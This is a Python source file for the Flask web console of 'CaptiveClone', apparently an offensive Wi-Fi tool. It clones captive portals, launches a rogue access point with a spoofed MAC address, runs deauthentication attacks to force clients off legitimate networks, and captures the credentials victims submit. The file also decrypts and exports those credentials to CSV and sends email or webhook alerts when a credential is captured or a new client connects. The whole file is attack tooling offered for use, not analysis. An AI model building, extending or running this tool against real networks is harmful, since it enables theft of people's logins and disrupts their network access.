"""
Web interface for CaptiveClone.

This module provides a Flask-based web interface for interacting with
CaptiveClone, managing portal analysis, and clone generation.
"""

import os
import json
import logging
from typing import Dict, List, Optional
from pathlib import Path
import threading
import time
import datetime
from collections import defaultdict
import hmac
import hashlib
import base64
from cryptography.fernet import Fernet

from flask import Flask, request, render_template, jsonify, send_from_directory, redirect, url_for, flash
from flask_socketio import SocketIO
from werkzeug.utils import secure_filename
from flask_mail import Mail, Message

from captiveclone.core.portal_analyzer import PortalAnalyzer
from captiveclone.core.portal_cloner import PortalCloner
from captiveclone.core.scanner import NetworkScanner
from captiveclone.core.models import WirelessNetwork, CaptivePortal
from captiveclone.core.access_point import AccessPoint
from captiveclone.core.deauthenticator import Deauthenticator
from captiveclone.core.credential_capture import CredentialCapture, CaptureEndpoint
from captiveclone.utils.config import Config
from captiveclone.utils.exceptions import CaptivePortalError, CloneGenerationError, APError, DeauthError, CaptureError

logger = logging.getLogger(__name__)

class WebInterface:
    """Flask-based web interface for CaptiveClone."""
    
    def __init__(self, config: Config, host: str = "127.0.0.1", port: int = 5000):
        """
        Initialize the web interface.
        
        Args:
            config: Configuration object
            host: Host address to bind to
            port: Port to listen on
        """
        self.config = config
        self.host = host
        self.port = port
        self.app = Flask(__name__, 
                         template_folder=str(Path(__file__).parent.parent / "templates"),
                         static_folder=str(Path(__file__).parent.parent / "static"))
        
        # Initialize Socket.IO for real-time updates
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        # Create necessary directories
        self.templates_dir = Path(__file__).parent.parent / "templates"
        self.static_dir = Path(__file__).parent.parent / "static"
        self.portal_clones_dir = Path(config.get_output_dir() or "portal_clones")
        self.credentials_dir = Path(config.get("capture", {}).get("output_dir", "captured_credentials"))
        
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.static_dir, exist_ok=True)
        os.makedirs(self.portal_clones_dir, exist_ok=True)
        os.makedirs(self.credentials_dir, exist_ok=True)
        
        # Initialize components
        self.analyzer = PortalAnalyzer()
        self.cloner = PortalCloner()
        self.scanner = None  # Initialize when needed
        self.ap = None  # Access point instance
        self.deauth = None  # Deauthenticator instance
        self.credentials = CredentialCapture(str(self.credentials_dir))
        self.capture_endpoint = None  # Initialize when needed
        
        # Store for active portals and networks
        self.networks: List[WirelessNetwork] = []
        self.portals: Dict[str, CaptivePortal] = {}
        self.clones: Dict[str, str] = {}  # clone_name -> path
        
        # Status trackers
        self.ap_running = False
        self.deauth_running = False
        self.capture_running = False
        
        # Register credential observer for real-time updates
        self.credentials.register_observer(self._credential_callback)
        
        # Encryption key for credentials
        self._generate_encryption_key()
        
        # Mail configuration for notifications
        self._configure_mail()
        
        # Configure Flask app
        self._configure_app()
    
    def _configure_app(self) -> None:
        """Configure the Flask application and routes."""
        # Register routes
        self.app.route("/")(self.index)
        self.app.route("/scan", methods=["GET", "POST"])(self.scan)
        self.app.route("/analyze", methods=["GET", "POST"])(self.analyze)
        self.app.route("/clone", methods=["GET", "POST"])(self.clone)
        self.app.route("/portal/<clone_name>")(self.portal)
        self.app.route("/portal-assets/<clone_name>/<path:filename>")(self.portal_assets)
        self.app.route("/download/<clone_name>")(self.download)
        
        # New routes for Phase 3
        self.app.route("/ap", methods=["GET", "POST"])(self.access_point)
        self.app.route("/ap/start", methods=["POST"])(self.start_ap)
        self.app.route("/ap/stop", methods=["POST"])(self.stop_ap)
        self.app.route("/deauth", methods=["GET", "POST"])(self.deauthenticate)
        self.app.route("/deauth/start", methods=["POST"])(self.start_deauth)
        self.app.route("/deauth/stop", methods=["POST"])(self.stop_deauth)
        self.app.route("/dashboard")(self.dashboard)
        self.app.route("/credentials")(self.view_credentials)
        self.app.route("/credentials/export", methods=["POST"])(self.export_credentials)
        
        # Data visualization API endpoints
        self.app.route("/api/stats/credentials/timeline")(self.api_credential_timeline)
        self.app.route("/api/stats/clients")(self.api_client_stats)
        self.app.route("/api/stats/success_rate")(self.api_success_rate)
        self.app.route("/api/network-map")(self.api_network_map)
        self.app.route("/api/notification-settings", methods=["POST"])(self.api_save_notification_settings)
        
        # Enhanced notification endpoints
        self.app.route("/notification-settings")(self.notification_settings)
        self.app.route("/notification-test/<notification_type>")(self.test_notification)
        
        # Error handlers
        self.app.errorhandler(404)(self.page_not_found)
        self.app.errorhandler(500)(self.server_error)
        
        # Configure secret key for flash messages
        self.app.secret_key = os.urandom(24)
        
        # SocketIO event handlers for real-time updates
        self.socketio.on_event('connect', self._socket_connect)
        self.socketio.on_event('disconnect', self._socket_disconnect)
    
    def start(self) -> None:
        """Start the web interface."""
        logger.info(f"Starting web interface on {self.host}:{self.port}")
        self.socketio.run(self.app, host=self.host, port=self.port, debug=self.config.get_debug_mode())
    
    def index(self):
        """Home page route."""
        return render_template("index.html", 
                              networks=self.networks, 
                              portals=self.portals, 
                              clones=self.clones,
                              ap_running=self.ap_running,
                              deauth_running=self.deauth_running,
                              capture_running=self.capture_running)
    
    def scan(self):
        """Scan for networks with captive portals."""
        if request.method == "POST":
            interface = request.form.get("interface", None)
            timeout = int(request.form.get("timeout", 60))
            
            try:
                self.scanner = NetworkScanner(interface=interface, timeout=timeout)
                self.networks = self.scanner.scan()
                flash(f"Scan complete. Found {len(self.networks)} networks.", "success")
            except Exception as e:
                logger.error(f"Error scanning networks: {str(e)}")
                flash(f"Error scanning networks: {str(e)}", "error")
            
            return redirect(url_for("index"))
        
        # GET request
        interfaces = self._get_interfaces()
        return render_template("scan.html", interfaces=interfaces)
    
    def analyze(self):
        """Analyze a captive portal."""
        if request.method == "POST":
            portal_url = request.form.get("portal_url", "")
            if not portal_url:
                flash("Please provide a portal URL.", "error")
                return redirect(url_for("analyze"))
            
            try:
                portal = self.analyzer.analyze_portal(portal_url)
                self.portals[portal_url] = portal
                flash(f"Portal analysis complete for {portal_url}.", "success")
                return redirect(url_for("index"))
            except CaptivePortalError as e:
                logger.error(f"Error analyzing portal: {str(e)}")
                flash(f"Error analyzing portal: {str(e)}", "error")
            
            return redirect(url_for("analyze"))
        
        # GET request
        return render_template("analyze.html")
    
    def clone(self):
        """Clone a captive portal."""
        if request.method == "POST":
            portal_url = request.form.get("portal_url", "")
            clone_name = request.form.get("clone_name", "")
            
            if not portal_url:
                flash("Please provide a portal URL.", "error")
                return redirect(url_for("clone"))
            
            try:
                clone_dir = self.cloner.clone_portal(portal_url, output_name=clone_name)
                clone_name = os.path.basename(clone_dir)
                self.clones[clone_name] = clone_dir
                flash(f"Portal clone generated at {clone_dir}.", "success")
                return redirect(url_for("index"))
            except CloneGenerationError as e:
                logger.error(f"Error cloning portal: {str(e)}")
                flash(f"Error cloning portal: {str(e)}", "error")
            
            return redirect(url_for("clone"))
        
        # GET request - populate form with existing portals
        return render_template("clone.html", portals=self.portals)
    
    def portal(self, clone_name):
        """View a cloned portal."""
        if clone_name not in self.clones:
            flash(f"Portal clone not found: {clone_name}", "error")
            return redirect(url_for("index"))
        
        clone_dir = self.clones[clone_name]
        index_path = os.path.join(clone_dir, "index.html")
        
        if not os.path.exists(index_path):
            flash(f"Portal index not found: {index_path}", "error")
            return redirect(url_for("index"))
        
        with open(index_path, 'r') as f:
            html_content = f.read()
        
        return render_template("portal_view.html", 
                              clone_name=clone_name, 
                              html_content=html_content)
    
    def portal_assets(self, clone_name, filename):
        """Serve portal assets."""
        if clone_name not in self.clones:
            return "Portal clone not found", 404
        
        clone_dir = self.clones[clone_name]
        return send_from_directory(clone_dir, filename)
    
    def download(self, clone_name):
        """Download a cloned portal."""
        if clone_name not in self.clones:
            flash(f"Portal clone not found: {clone_name}", "error")
            return redirect(url_for("index"))
        
        # TODO: Implement zip creation and download
        flash("Download functionality not implemented yet.", "warning")
        return redirect(url_for("index"))
    
    def access_point(self):
        """Access point management page."""
        interfaces = self._get_interfaces()
        return render_template("access_point.html", 
                              interfaces=interfaces, 
                              networks=self.networks,
                              ap_running=self.ap_running,
                              clones=self.clones)
    
    def start_ap(self):
        """Start the access point."""
        if self.ap_running:
            flash("Access point is already running.", "warning")
            return redirect(url_for("access_point"))
        
        interface = request.form.get("interface")
        network_bssid = request.form.get("network_bssid")
        clone_name = request.form.get("clone_name")
        hidden = request.form.get("hidden") == "on"
        spoof_mac = request.form.get("spoof_mac") == "on"
        
        # Validate input
        if not interface or not network_bssid or not clone_name:
            flash("Please provide all required fields.", "error")
            return redirect(url_for("access_point"))
        
        # Find the target network
        target_network = None
        for network in self.networks:
            if network.bssid == network_bssid:
                target_network = network
                break
        
        if not target_network:
            flash("Target network not found.", "error")
            return redirect(url_for("access_point"))
        
        # Get clone directory
        if clone_name not in self.clones:
            flash("Portal clone not found.", "error")
            return redirect(url_for("access_point"))
        
        clone_dir = self.clones[clone_name]
        
        try:
            # Initialize access point
            self.ap = AccessPoint(interface, clone_dir)
            
            # Set MAC address if spoofing is enabled
            if spoof_mac and target_network.bssid:
                self.ap.set_mac_address(target_network.bssid)
            
            # Start access point
            self.ap.start(target_network, hidden)
            self.ap_running = True
            
            # Start credential capture endpoint if not already running
            if not self.capture_running:
                self._start_capture_endpoint()
            
            flash(f"Access point '{target_network.ssid}' started on {interface}.", "success")
        except APError as e:
            logger.error(f"Error starting access point: {str(e)}")
            flash(f"Error starting access point: {str(e)}", "error")
        
        return redirect(url_for("dashboard"))
    
    def stop_ap(self):
        """Stop the access point."""
        if not self.ap_running or not self.ap:
            flash("No access point is running.", "warning")
            return redirect(url_for("access_point"))
        
        try:
            self.ap.stop()
            self.ap_running = False
            self.ap = None
            flash("Access point stopped.", "success")
        except APError as e:
            logger.error(f"Error stopping access point: {str(e)}")
            flash(f"Error stopping access point: {str(e)}", "error")
        
        return redirect(url_for("access_point"))
    
    def deauthenticate(self):
        """Deauthentication management page."""
        interfaces = self._get_interfaces()
        return render_template("deauthenticate.html", 
                              interfaces=interfaces, 
                              networks=self.networks,
                              deauth_running=self.deauth_running)
    
    def start_deauth(self):
        """Start the deauthenticator."""
        if self.deauth_running:
            flash("Deauthenticator is already running.", "warning")
            return redirect(url_for("deauthenticate"))
        
        interface = request.form.get("interface")
        network_bssid = request.form.get("network_bssid")
        target_all = request.form.get("target_all") == "on"
        
        # Validate input
        if not interface or not network_bssid:
            flash("Please provide all required fields.", "error")
            return redirect(url_for("deauthenticate"))
        
        # Find the target network
        target_network = None
        for network in self.networks:
            if network.bssid == network_bssid:
                target_network = network
                break
        
        if not target_network:
            flash("Target network not found.", "error")
            return redirect(url_for("deauthenticate"))
        
        try:
            # Initialize deauthenticator
            self.deauth = Deauthenticator(interface)
            
            # Set target network
            self.deauth.set_target_network(target_network)
            
            # Start deauthenticator
            self.deauth.start(target_all_clients=target_all)
            self.deauth_running = True
            
            # Start a background thread to update client list
            threading.Thread(target=self._update_client_list, daemon=True).start()
            
            flash(f"Deauthenticator started targeting '{target_network.ssid}'.", "success")
        except DeauthError as e:
            logger.error(f"Error starting deauthenticator: {str(e)}")
            flash(f"Error starting deauthenticator: {str(e)}", "error")
        
        return redirect(url_for("dashboard"))
    
    def stop_deauth(self):
        """Stop the deauthenticator."""
        if not self.deauth_running or not self.deauth:
            flash("No deauthenticator is running.", "warning")
            return redirect(url_for("deauthenticate"))
        
        try:
            self.deauth.stop()
            self.deauth_running = False
            self.deauth = None
            flash("Deauthenticator stopped.", "success")
        except DeauthError as e:
            logger.error(f"Error stopping deauthenticator: {str(e)}")
            flash(f"Error stopping deauthenticator: {str(e)}", "error")
        
        return redirect(url_for("deauthenticate"))
    
    def dashboard(self):
        """Dashboard page for monitoring attack status."""
        # Get statistics for dashboard
        client_stats = self._get_client_stats()
        credential_stats = self._get_credential_stats()
        
        return render_template("dashboard.html", 
                              ap_running=self.ap_running,
                              deauth_running=self.deauth_running,
                              capture_running=self.capture_running,
                              client_stats=client_stats,
                              credential_stats=credential_stats)
    
    def view_credentials(self):
        """View captured credentials."""
        # Get credentials, decrypt sensitive fields
        raw_credentials = self.credentials.get_all_credentials()
        encrypted_fields = ['password', 'token', 'pin', 'secret']
        
        # Decrypt sensitive fields
        credentials = []
        for cred in raw_credentials:
            decrypted_cred = dict(cred)
            for field in encrypted_fields:
                if field in decrypted_cred and decrypted_cred[field]:
                    try:
                        # Check if it's encrypted (has the encrypted: prefix)
                        if decrypted_cred[field].startswith('encrypted:'):
                            encrypted_value = decrypted_cred[field][10:]
                            decrypted_value = self.fernet.decrypt(encrypted_value.encode()).decode()
                            decrypted_cred[field] = decrypted_value
                    except Exception as e:
                        logger.error(f"Error decrypting field {field}: {str(e)}")
            credentials.append(decrypted_cred)
        
        return render_template("credentials.html", credentials=credentials)
    
    def export_credentials(self):
        """Export credentials to CSV."""
        try:
            csv_file = self.credentials.export_csv()
            flash(f"Credentials exported to {csv_file}.", "success")
        except CaptureError as e:
            logger.error(f"Error exporting credentials: {str(e)}")
            flash(f"Error exporting credentials: {str(e)}", "error")
        
        return redirect(url_for("view_credentials"))
    
    def page_not_found(self, e):
        """404 error handler."""
        return render_template("404.html"), 404
    
    def server_error(self, e):
        """500 error handler."""
        return render_template("500.html"), 500
    
    def _get_interfaces(self) -> List[str]:
        """Get a list of available wireless interfaces."""
        try:
            # This would use the hardware abstraction layer in a real implementation
            # For now, we'll just return a placeholder
            return ["wlan0", "wlan1"]
        except Exception as e:
            logger.error(f"Error getting interfaces: {str(e)}")
            return [] 
    
    def _credential_callback(self, credential):
        """Callback for credential capture events."""
        # Encrypt sensitive fields before storing
        encrypted_credential = dict(credential)
        encrypted_fields = ['password', 'token', 'pin', 'secret']
        
        for field in encrypted_fields:
            if field in encrypted_credential and encrypted_credential[field]:
                try:
                    # Encrypt the field value if not already encrypted
                    if not encrypted_credential[field].startswith('encrypted:'):
                        encrypted_value = self.fernet.encrypt(encrypted_credential[field].encode()).decode()
                        encrypted_credential[field] = f"encrypted:{encrypted_value}"
                except Exception as e:
                    logger.error(f"Error encrypting field {field}: {str(e)}")
        
        # Forward to SocketIO for real-time updates
        self.socketio.emit('credential_captured', {
            'ip_address': credential.get('ip_address', 'unknown'),
            'username': credential.get('username', 'unknown'),
            'timestamp': credential.get('timestamp', datetime.datetime.now().isoformat()),
            'form_type': credential.get('form_type', 'unknown')
        })
        
        # Send email notification if enabled
        notification_config = self.config.get("notifications", {})
        if notification_config.get("email", {}).get("enabled") and notification_config.get("events", {}).get("credential_captured"):
            subject = "CaptiveClone: Credential Captured"
            body = f"""A new credential was captured:
            
IP Address: {credential.get('ip_address', 'unknown')}
Username: {credential.get('username', 'unknown')}
Timestamp: {credential.get('timestamp', 'N/A')}
Form Type: {credential.get('form_type', 'unknown')}
            """
            self._send_notification_email(subject, body)
        
        # Send webhook notification if enabled
        if notification_config.get("webhook", {}).get("enabled") and notification_config.get("events", {}).get("credential_captured"):
            webhook_data = {
                "event": "credential_captured",
                "data": {
                    "ip_address": credential.get('ip_address', 'unknown'),
                    "username": credential.get('username', 'unknown'),
                    "timestamp": credential.get('timestamp', datetime.datetime.now().isoformat()),
                    "form_type": credential.get('form_type', 'unknown')
                }
            }
            self._send_webhook_notification(webhook_data)
    
    def _update_client_list(self):
        """Update the client list via SocketIO."""
        if not self.ap or not hasattr(self.ap, "get_connected_clients"):
            return
        
        if not self.ap.is_running():
            return
        
        clients = self.ap.get_connected_clients()
        self.socketio.emit('client_list_update', {
            'clients': clients
        })
        
        # Send notifications for new clients if enabled
        notification_config = self.config.get("notifications", {})
        if notification_config.get("events", {}).get("client_connected"):
            for client in clients:
                if client.get("status") == "connected" and client.get("new", False):
                    # Client just connected, send notification
                    self.socketio.emit('client_connected', {
                        'mac_address': client.get('mac', 'unknown'),
                        'ip_address': client.get('ip', 'unknown'),
                        'hostname': client.get('hostname', 'unknown')
                    })
                    
                    # Send email notification if enabled
                    if notification_config.get("email", {}).get("enabled"):
                        subject = "CaptiveClone: New Client Connected"
                        body = f"""A new client connected to the rogue AP:
                        
MAC Address: {client.get('mac', 'unknown')}
IP Address: {client.get('ip', 'unknown')}
Hostname: {client.get('hostname', 'unknown')}
                        """
                        self._send_notification_email(subject, body)
                    
                    # Send webhook notification if enabled
                    if notification_config.get("webhook", {}).get("enabled"):
                        webhook_data = {
                            "event": "client_connected",
                            "data": {
                                "mac_address": client.get('mac', 'unknown'),
                                "ip_address": client.get('ip', 'unknown'),
                                "hostname": client.get('hostname', 'unknown')
                            }
                        }
                        self._send_webhook_notification(webhook_data)
    
    def _start_capture_endpoint(self):
        """Start the credential capture endpoint."""
        if self.capture_running:
            return
        
        # Default port from config or use 8080
        port = self.config.get("capture", {}).get("port", 8080)
        
        try:
            self.capture_endpoint = CaptureEndpoint(self.credentials, port)
            self.capture_endpoint.start()
            self.capture_running = True
            logger.info(f"Started credential capture endpoint on port {port}")
        except CaptureError as e:
            logger.error(f"Failed to start capture endpoint: {str(e)}")
            flash(f"Failed to start capture endpoint: {str(e)}", "error")
    
    def _socket_connect(self):
        """Handle SocketIO connection."""
        logger.debug("Client connected to SocketIO")
    
    def _socket_disconnect(self):
        """Handle SocketIO disconnection."""
        logger.debug("Client disconnected from SocketIO")
    
    def _generate_encryption_key(self) -> None:
        """Generate or load encryption key for credentials."""
        key_path = Path(self.config.get("security", {}).get("key_file", "credential_key.key"))
        
        if key_path.exists():
            with open(key_path, "rb") as key_file:
                self.encryption_key = key_file.read()
        else:
            self.encryption_key = Fernet.generate_key()
            # Ensure directory exists
            key_path.parent.mkdir(parents=True, exist_ok=True)
            with open(key_path, "wb") as key_file:
                key_file.write(self.encryption_key)
        
        self.fernet = Fernet(self.encryption_key)
    
    def _configure_mail(self) -> None:
        """Configure mail for notifications."""
        mail_config = self.config.get("notifications", {}).get("mail", {})
        
        self.mail_enabled = mail_config.get("enabled", False)
        if self.mail_enabled:
            self.app.config.update(
                MAIL_SERVER=mail_config.get("server", "smtp.gmail.com"),
                MAIL_PORT=mail_config.get("port", 587),
                MAIL_USE_TLS=mail_config.get("use_tls", True),
                MAIL_USERNAME=mail_config.get("username"),
                MAIL_PASSWORD=mail_config.get("password"),
                MAIL_DEFAULT_SENDER=mail_config.get("default_sender")
            )
            self.mail = Mail(self.app)
        else:
            self.mail = None
    
    def notification_settings(self):
        """Notification settings page."""
        return render_template("notification_settings.html")
    
    def test_notification(self, notification_type):
        """Test a specific notification type."""
        if notification_type == "email":
            if not self.mail_enabled:
                flash("Email notifications are not configured.", "error")
                return redirect(url_for("notification_settings"))
                
            try:
                msg = Message("CaptiveClone Test Notification",
                             recipients=[request.args.get("email")])
                msg.body = "This is a test notification from CaptiveClone."
                self.mail.send(msg)
                flash("Test email sent successfully.", "success")
            except Exception as e:
                flash(f"Error sending test email: {str(e)}", "error")
                
        elif notification_type == "webhook":
            webhook_url = request.args.get("webhook_url")
            if not webhook_url:
                flash("No webhook URL provided.", "error")
                return redirect(url_for("notification_settings"))
                
            try:
                # Send test webhook
                webhook_data = {
                    "title": "Test Webhook",
                    "message": "This is a test webhook notification from CaptiveClone.",
                    "timestamp": datetime.datetime.now().isoformat(),
                    "type": "test"
                }
                
                import requests
                response = requests.post(webhook_url, json=webhook_data, timeout=5)
                
                if response.status_code < 400:
                    flash("Test webhook sent successfully.", "success")
                else:
                    flash(f"Error sending webhook: {response.status_code}", "error")
            except Exception as e:
                flash(f"Error sending test webhook: {str(e)}", "error")
        
        return redirect(url_for("notification_settings"))
    
    # API Endpoints for Data Visualization
    
    def api_credential_timeline(self):
        """API endpoint for credential capture timeline data."""
        # Get all credentials
        credentials = self.credentials.get_all_credentials()
        
        # Group by hour
        timeline = defaultdict(int)
        
        for cred in credentials:
            timestamp = cred.get("timestamp")
            if timestamp:
                try:
                    dt = datetime.datetime.fromisoformat(timestamp)
                    hour_key = dt.strftime("%Y-%m-%d %H:00")
                    timeline[hour_key] += 1
                except Exception as e:
                    logger.error(f"Error parsing timestamp: {str(e)}")
        
        # Sort by time and prepare for chart
        sorted_timeline = sorted(timeline.items())
        
        return jsonify({
            "labels": [item[0] for item in sorted_timeline],
            "values": [item[1] for item in sorted_timeline]
        })
    
    def api_client_stats(self):
        """API endpoint for client statistics."""
        stats = self._get_client_stats()
        return jsonify(stats)
    
    def api_success_rate(self):
        """API endpoint for attack success rate."""
        # Get credential success/failure stats
        credentials = self.credentials.get_all_credentials()
        
        success = sum(1 for cred in credentials if cred.get("success", True))
        failure = sum(1 for cred in credentials if not cred.get("success", True))
        
        return jsonify({
            "success": success,
            "failure": failure
        })
    
    def api_network_map(self):
        """API endpoint for network map data."""
        nodes = []
        links = []
        
        # Get access point data
        if self.ap and hasattr(self.ap, "interface") and self.ap.is_running():
            ap_node = {
                "id": "ap_" + self.ap.interface,
                "name": self.ap.ssid,
                "type": "ap",
                "is_target": True,
                "channel": self.ap.channel,
                "clientCount": 0
            }
            nodes.append(ap_node)
            
            # Get connected clients
            clients = self.ap.get_connected_clients() if hasattr(self.ap, "get_connected_clients") else []
            
            for client in clients:
                client_id = "client_" + client["mac"]
                
                # Add client node
                client_node = {
                    "id": client_id,
                    "mac": client["mac"],
                    "type": "client",
                    "status": client.get("status", "connected"),
                    "connected_to": ap_node["id"]
                }
                nodes.append(client_node)
                
                # Add link
                links.append({
                    "source": client_id,
                    "target": ap_node["id"],
                    "value": 1
                })
                
                # Increment client count
                ap_node["clientCount"] += 1
        
        # Add nearby networks if scanner has results
        if self.networks:
            for network in self.networks:
                if network.bssid and network.ssid:
                    network_id = "network_" + network.bssid
                    
                    # Skip if this is our AP
                    if self.ap and hasattr(self.ap, "bssid") and network.bssid == self.ap.bssid:
                        continue
                    
                    # Add network node
                    network_node = {
                        "id": network_id,
                        "name": network.ssid,
                        "type": "ap",
                        "is_target": False,
                        "channel": network.channel,
                        "clientCount": 0
                    }
                    nodes.append(network_node)
        
        return jsonify({
            "nodes": nodes,
            "links": links
        })
    
    def api_save_notification_settings(self):
        """API endpoint to save notification settings."""
        try:
            settings = request.json
            
            # Validate email if enabled
            if settings.get("enableEmailAlerts") and not settings.get("emailAddress"):
                return jsonify({"success": False, "error": "Email address is required"})
            
            # Validate webhook if enabled
            if settings.get("enableWebhooks") and not settings.get("webhookUrl"):
                return jsonify({"success": False, "error": "Webhook URL is required"})
            
            # Save to config
            notification_config = self.config.get("notifications", {})
            notification_config.update({
                "browser": settings.get("enableBrowserNotifications", True),
                "sound": settings.get("enableSoundAlerts", True),
                "email": {
                    "enabled": settings.get("enableEmailAlerts", False),
                    "address": settings.get("emailAddress", "")
                },
                "webhook": {
                    "enabled": settings.get("enableWebhooks", False),
                    "url": settings.get("webhookUrl", "")
                },
                "events": {
                    "client_connected": settings.get("notifyOnNewClients", True),
                    "credential_captured": settings.get("notifyOnCredentials", True),
                    "attack_status": settings.get("notifyOnAttackStatus", True)
                }
            })
            
            self.config.set("notifications", notification_config)
            self.config.save()
            
            return jsonify({"success": True})
        except Exception as e:
            logger.error(f"Error saving notification settings: {str(e)}")
            return jsonify({"success": False, "error": str(e)})
    
    # Helper methods for data and statistics
    
    def _get_client_stats(self) -> Dict:
        """Get client statistics."""
        total_clients = 0
        connected = 0
        deauthenticated = 0
        captured = 0
        
        # Get clients from AP if running
        if self.ap and hasattr(self.ap, "get_connected_clients") and self.ap.is_running():
            clients = self.ap.get_connected_clients()
            total_clients = len(clients)
            
            for client in clients:
                status = client.get("status", "")
                if status == "connected":
                    connected += 1
                elif status == "deauthenticated":
                    deauthenticated += 1
        
        # Count captured credentials (unique IPs)
        credentials = self.credentials.get_all_credentials()
        captured_ips = set()
        
        for cred in credentials:
            ip = cred.get("ip_address")
            if ip:
                captured_ips.add(ip)
        
        captured = len(captured_ips)
        
        return {
            "total_clients": total_clients,
            "connected": connected,
            "deauthenticated": deauthenticated,
            "captured": captured
        }
    
    def _get_credential_stats(self) -> Dict:
        """Get credential statistics."""
        credentials = self.credentials.get_all_credentials()
        
        total = len(credentials)
        
        # Count by credential type
        types = defaultdict(int)
        for cred in credentials:
            form_type = cred.get("form_type", "unknown")
            types[form_type] += 1
        
        # Get most recent
        recent = []
        if credentials:
            # Sort by timestamp (descending)
            sorted_creds = sorted(
                credentials, 
                key=lambda x: x.get("timestamp", ""), 
                reverse=True
            )
            recent = sorted_creds[:5]  # Get 5 most recent
        
        return {
            "total": total,
            "types": dict(types),
            "recent": recent
        }
    
    # Notification methods
    
    def _send_notification_email(self, subject: str, body: str) -> bool:
        """Send notification email."""
        if not self.mail_enabled or not self.mail:
            return False
        
        try:
            email_config = self.config.get("notifications", {}).get("email", {})
            if not email_config.get("enabled"):
                return False
            
            recipient = email_config.get("address")
            if not recipient:
                return False
            
            msg = Message(subject, recipients=[recipient])
            msg.body = body
            self.mail.send(msg)
            return True
        except Exception as e:
            logger.error(f"Error sending notification email: {str(e)}")
            return False
    
    def _send_webhook_notification(self, data: Dict) -> bool:
        """Send webhook notification."""
        try:
            webhook_config = self.config.get("notifications", {}).get("webhook", {})
            if not webhook_config.get("enabled"):
                return False
            
            webhook_url = webhook_config.get("url")
            if not webhook_url:
                return False
            
            import requests
            response = requests.post(webhook_url, json=data, timeout=5)
            return response.status_code < 400
        except Exception as e:
            logger.error(f"Error sending webhook notification: {str(e)}")
            return False 